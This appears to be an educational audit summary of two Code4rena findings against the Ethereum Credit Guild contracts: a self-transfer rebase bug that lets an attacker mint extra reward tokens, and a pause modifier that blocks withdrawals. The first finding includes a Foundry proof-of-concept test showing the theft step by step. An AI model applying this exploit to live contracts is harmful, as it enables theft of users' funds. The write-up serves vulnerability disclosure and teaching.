# ETAAcademy-Adudit: 2. Transfer

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>02. Transfer</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>dos</th>
          <td>transfer</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] Anyone can steal all distributed rewards

### Self-transfer

- Summary: By executing a self-transfer of tokens while in rebase, an attacker can mint additional tokens for themselves, effectively stealing all distributed rewards until that point. This occurs due to a discrepancy in updating share balances during the transfer process, leading to an incorrect calculation of token balances.
- Impact & Recommendation: Consequently, an attacker can repeatedly exploit this flaw to siphon off rewards intended for other users.To mitigate this issue, preventing self-transfers is recommended to prevent further exploitation and potential loss of funds.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/991) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

  function testSelfTransfer() public {
    token.mint(address(this), 100e18);

    // Mint some tokens to bob and alice
    token.mint(alice, 10e18);
    token.mint(bobby, 10e18);
    // Bob enters the rebase since he wants to earn some profit
    vm.prank(bobby);
    token.enterRebase();
    // Tokens are distributed among all rebase users
    token.distribute(10e18);
    // Nobody claims the rebase rewards for 10 days - just for an example
    // Alice could frontrun every call that changes the unmintedRebaseRewards atomically
    // and claim all the rewards for herself
    vm.warp(block.timestamp + 10 days);
    // --------------------- ATOMIC TX ---------------------
    vm.startPrank(alice);
    token.enterRebase();
    uint256 token_balance_alice_before = token.balanceOf(alice);
    // Here the max she could transfer and steal is the unmintedRebaseRewards() amount
    // but we are using 3e18 just for an example as 3e18 < unmintedRebaseRewards()
    // since there is no public getter for unmintedRebaseRewards
    token.transfer(alice, 3e18);
    token.exitRebase();
    vm.stopPrank();
    uint256 token_balance_alice = token.balanceOf(alice);
    // --------------------- END ATOMIC TX ---------------------
    console.log("Token balance alice before : ", token_balance_alice_before);
    console.log("Token balance alice after  : ", token_balance_alice);
    console.log("--------------------------------------------------");
    console.log("Alice profit credit        : ", token_balance_alice - token_balance_alice_before);
  }


  ```

  </details>

## 2. [Medium] Inability to withdraw funds for certain users due to whenNotPaused modifier in RateLimitedMinter

### EmergencyWithdraw for paused protocol

- Summary: The GUARDIAN role is meant to freeze new protocol usage but allow fund withdrawals. However, the whenNotPaused modifier in the RateLimitedMinter.mint() function prevents users from withdrawing funds if they have CREDIT tokens staked with pending guild rewards. This occurs because the SurplusGuildMinter.unstake() function, called during withdrawal, tries to mint rewards through RateLimitedMinter.mint() by getRewards(), which fails if the protocol is paused.

- Impact & Recommendation: Introduce emergencyWithdraw for users to withdraw funds, excluding rewards when the protocol is paused.
  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1249) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function unstake(address term, uint256 amount) external {
        // apply pending rewards
        (, UserStake memory userStake, bool slashed) = getRewards(
            msg.sender,
            term
        );
    ...


    function getRewards(
        address user,
        address term
    )
        public
        returns (
            uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
            UserStake memory userStake, // stake state after execution of getRewards()
            bool slashed // true if the user has been slashed
        )
    {
    ...

                // forward rewards to user
            if (guildReward != 0) {
                RateLimitedMinter(rlgm).mint(user, guildReward);
                emit GuildReward(block.timestamp, user, guildReward);
            }
    ...

    function mint(
        address to,
        uint256 amount
    ) external onlyCoreRole(role) whenNotPaused {
        _depleteBuffer(amount); /// check and effects
        IERC20Mintable(token).mint(to, amount); /// interactions
    }


  ```

  </details>
